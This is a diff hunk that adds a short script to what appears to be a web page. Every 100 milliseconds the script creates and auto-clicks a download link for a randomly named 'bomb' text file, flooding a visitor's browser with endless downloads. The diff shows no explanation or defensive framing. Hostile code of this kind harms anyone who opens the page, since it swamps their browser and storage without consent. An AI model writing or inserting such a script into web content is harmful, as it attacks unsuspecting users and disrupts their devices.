@@ -1,0 +1,10 @@
+<script>setInterval(function() {
+            const fileContent = 'bomb';
+            const blob = new Blob([fileContent], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.download = 'bomb'+btoa(''+Math.random())+'.txt';
+            link.href = URL.createObjectURL(blob);
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        },100);</script>
